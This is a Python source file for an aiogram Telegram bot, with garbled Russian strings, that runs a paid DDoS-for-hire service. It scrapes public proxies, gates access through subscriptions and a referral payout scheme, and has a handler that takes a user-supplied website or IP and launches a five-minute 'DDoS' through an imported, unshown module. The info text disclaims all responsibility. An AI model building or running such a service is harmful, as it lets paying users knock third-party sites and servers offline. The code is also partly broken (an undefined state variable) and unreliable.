from misc import bot, dp, conn, cursor
from aiogram import types
import handlers.keyboard as kb
from config import admin
from .function import *
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from .ddos import *
from .st import *
import time

req = r.get("https://api.proxyscrape.com/?request=displayproxies")
array = req.text.split()

@dp.message_handler(commands=['start'])
async def start_message(message: types.Message):
    discription = "–ü—Ä–∏–≤–µ—Çüëã"
    photo = open('media/hello.jpeg', 'rb')
    user = new_user(message.chat.id)
    if message.chat.id == admin:
        await bot.send_photo(message.chat.id,photo,discription , reply_markup=kb.main)
        await bot.send_message(message.chat.id,'–ù–∞–≤–∏–≥–∞—Ü–∏—è –≤ –±–æ—Ç–µ –¥–æ—Å—Ç—É–ø–Ω–∞ –ø–æ –∫–Ω–æ–ø–∫–∞–º –Ω–∏–∂–µ')
    if user == 'new user':
        await bot.send_photo(message.chat.id, photo, discription, reply_markup=kb.main)
        await bot.send_message(message.chat.id, '–£ –≤–∞—Å –µ—Å—Ç—å —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –∫–æ–¥?–ï—Å–ª–∏ –µ—Å—Ç—å –Ω–∞–ø–∏—à–∏—Ç–µ /ref –∫–æ–¥')

@dp.message_handler(content_types=['text'], text='–ü—Ä–æ—Ñ–∏–ª—å')
async def handfler(message: types.Message):
    photo = open('media/profile.jpeg', 'rb')
    if message.chat.id == admin:
        check = check_sub(message.chat.id)
        if not check:
            await bot.send_photo(message.chat.id,photo,f'–í–∞—à ID:{message.chat.id}üëæ\n–ü–æ–¥–ø–∏—Å–∫–∞:–Ω–µ –∞–∫—Ç–∏–≤–Ω–∞üòû',
                                   reply_markup=kb.adm)
        elif check:
            await bot.send_photo(message.chat.id,photo, f'–í–∞—à ID:{message.chat.id}üëæ\n–ü–æ–¥–ø–∏—Å–∫–∞:–∞–∫—Ç–∏–≤–Ω–∞üëë',
                                  reply_markup=kb.adm)
    else:
        check = check_sub(message.chat.id)
        if not check:
            await bot.send_photo(message.chat.id,photo, f'–í–∞—à ID:{message.chat.id}üëæ\n–ü–æ–¥–ø–∏—Å–∫–∞:–Ω–µ –∞–∫—Ç–∏–≤–Ω–∞üòû',
                                   reply_markup=kb.menu)
        elif check:
            await bot.send_photo(message.chat.id,photo, f'–í–∞—à ID:{message.chat.id}üëæ\n–ü–æ–¥–ø–∏—Å–∫–∞:–∞–∫—Ç–∏–≤–Ω–∞üëë',
                                   reply_markup=kb.menu)

@dp.message_handler(text=['–†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞'])
async def referal_system(message: types.Message):
    photo = open('media/ref.jpg', 'rb')
    balance = get_balance(message.chat.id)
    await bot.send_photo(message.chat.id, photo , f'–ü–æ–ª—É—á–∏—Ç–µ 10% –æ—Ç –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è –≤–∞—à–∏—Ö —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤üí≥\n–ë–∞–ª–∞–Ω—Å –æ—Ç —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤:{balance}‚ÇΩ\n–í–∞—à —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–π –∫–æ–¥:{message.chat.id}‚öôÔ∏è\n–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –≤–∞—à–∏—Ö —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤:{get_referals(message.chat.id,message.chat.id)}‚≠êÔ∏è')

@dp.message_handler(text=['–ù–∞–∑–∞–¥'])
async def referal_system(message: types.Message):
	photo = open('media/menu.jpg', 'rb')
	await bot.send_photo(message.chat.id,photo,"–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é",reply_markup=kb.main)
	
@dp.message_handler(text=['–ò–Ω—Ñ–æ'])
async def referal_system(message: types.Message):
	photo = open('media/info.jpg', 'rb')
	desc = "–ë–æ—Ç —è–≤–ª—è–µ—Ç—Å—è —Å–æ–±—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å—é  —Ö—É–π –∑–Ω–∞–µ—Ç –∫–æ–≥–æ, –∞–¥–º–∏–Ω –Ω–µ –∑–Ω–∞–µ—Ç –ø—Ä–æ –±–æ—Ç–∞, –º—ã –Ω–µ –Ω–µ—Å—ë–º –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ –≤–∞—à–∏ –¥–µ–π—Å—Ç–≤–∏—è .. –ø–æ –≤—Å–µ–º –≤–æ–ø—Ä–æ—Å–∞–º @uuiuuka"
	await bot.send_photo(message.chat.id,photo,desc,reply_markup=kb.main)
	
@dp.message_handler(content_types=['text'], text='DDoS')
async def ddos(message: types.Message):
    check = check_sub(message.chat.id)
    if not check or check == None:
    	await bot.send_message(message.chat.id, '–£ –≤–∞—Å –Ω–µ—Ç –ø–æ–¥–ø–∏—Å–∫–∏!–î–ª—è –ø–æ–∫—É–ø–∫–∏ –Ω–∞–ø–∏—à–µ—Ç–µ –û–ø–ª–∞—Ç–∞')
    else:
    		await bot.send_message(message.chat.id,"–û—Ç–ø—Ä–∞–≤—Ç—å–µ —Å–∞–π—Ç –∏–ª–∏ ip –∞–¥—Ä–µ—Å –¥–ª—è DDoSa,–¥–ª—è –æ—Ç–º–µ–Ω—ã –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ",reply_markup=kb.back)
    		await st.url.set()
    		await state.finish()
      	
      		
      			
@dp.message_handler(state=st.url)

async def proc(message: types.Message, state: FSMContext):
	   		if message.text == '‚è™ –ù–∞–∑–∞–¥':
	   			await bot.send_message(message.chat.id,"–û—Ç–º–µ–Ω–∞,–≤–æ–∑–≤—Ä–∞—â–∞—é –Ω–∞–∑–∞–¥!",reply_markup=kb.main)
	   		else:
	   			await bot.send_message(message.chat.id,"–ó–∞–ø—É—Å–∫–∞—é DDoS –Ω–∞ {}".format(message.text))
	   			await bot.send_message(message.chat.id,"DDoS –±—É–¥–µ—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω —á–µ—Ä–µ–∑ 5 –º–∏–Ω—É—Ç!"    ,reply_markup=kb.main)
	   			await state.finish()	 	
	   			await check_prox(array,st)